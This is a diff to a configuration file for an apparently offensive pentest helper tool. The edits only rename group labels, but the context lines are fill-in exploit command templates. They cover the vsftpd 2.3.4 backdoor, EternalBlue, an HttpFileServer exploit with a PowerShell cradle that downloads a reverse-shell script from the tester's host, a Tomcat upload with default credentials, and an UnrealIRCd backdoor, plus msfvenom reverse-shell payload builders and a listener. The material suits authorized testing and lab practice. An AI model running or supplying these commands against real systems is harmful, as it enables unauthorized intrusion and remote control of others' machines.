@@ -53,21 +53,21 @@ group: SMB
 description: exploit vsftpd 2.3.4 vulnerability
 template: searchsploit -m 49757.py; python 49757.py {host}
 condition: ["vsftpd 2.3.4"]
-group: Exploit Command
+group: Exploit
 [end]
 
 [Echidna]
 description: exploit vsftpd 2.3.4 vulnerability with metasploit
 template: msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor; set rhosts {host}; exploit"
 condition: ["vsftpd 2.3.4"]
-group: Exploit Command
+group: Exploit
 [end]
 
 [Echidna]
 pattern: ping
 description: test the reachability of a host on an Internet Protocol network
 template: ping {host}
-group: USEFUL COMMAND
+group: Useful Command
 [end]
 
 [Echidna]
@@ -75,28 +75,28 @@ description: exploit ms17-010 vulnerability
 template: searchsploit -m 42315.py; python 42315.py {host}
 template: msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set rhosts {host}; set lhost {localip}; exploit"
 condition: ["ms17-010"]
-group: Exploit Command
+group: Exploit
 [end]
 
 [Echidna]
 description: exploit HttpFileServer 2.3.x vulnerability
 template: searchsploit -m 49125.py; python3 49125.py {host} {port} "powershell.exe iex(new-object net.webclient).downloadstring('http://{localip}/Invoke-PowerShellTcp.ps1'"
 condition: ["HttpFileServer", "HFS 2.3"]
-group: Exploit Command
+group: Exploit
 [end]
 
 [Echidna]
 description: exploit tomcat service using default credentials
 template: msfconsole -x "use exploit/multi/http/tomcat_mgr_upload; set PAYLOAD java/meterpreter/reverse_tcp; set rhosts {host}; set lhost {localip}; set HTTPUSERNAME tomcat; set HTTPPASSWORD s3cret; set RPORT 8080; exploit"
 condition: ["tomcat"]
-group: Exploit Command
+group: Exploit
 [end]
 
 [Echidna]
 description: exploit UnreaIRCD IRC vulnerability (CVE-2010-2075)
 template: msfconsole -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set rhosts {host}; set payload cmd/unix/bind_perl;exploit"
 condition: ["UnrealIRCd"]
-group: Exploit Command
+group: Exploit
 [end]
 
 [Echidna]
@@ -129,7 +129,7 @@ group: Privilege Escalation Command
 description: enumlation of vulnerability for privilege escalation with metasploit
 template: use post/multi/recon/local_exploit_suggester; set session 1; exploit;
 condition: ["^(?!.*default).*$"]
-group: Privilege Escalation Command with Metasploit
+group: Privilege Escalation Command
 [end]
 
 [Echidna]
@@ -160,7 +160,7 @@ description: search exploit code
 template: searchsploit {version}
 template: searchsploit -m {exploitPath}
 condition: ["exploitPath", "version"]
-group: EXPLOIT
+group: Exploit
 [end]
 
 [Echidna]
@@ -179,13 +179,13 @@ template: msfvenom LPORT=4444 -f exe -a x86  -p windows/meterpreter/reverse_tcp 
 template: msfvenom LPORT=4444 -f elf -p linux/x86/meterpreter/reverse_tcp -o payload.elf LHOST={localip}
 template: msfvenom LPORT=4444 -f asp -p windows/meterpreter/reverse_tcp -o payload.asp LHOST={localip}
 template: msfvenom LPORT=4444 -f raw -p cmd/unix/reverse_python LHOST={localip}
-group: USEFUL COMMAND
+group: Useful Command
 [end]
 
 [Echidna]
 description: create reverse shell by msfvenom
 template: msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lport 4444; set lhost {localip};"
-group: USEFUL COMMAND
+group: Useful Command
 [end]
 
 [Echidna]
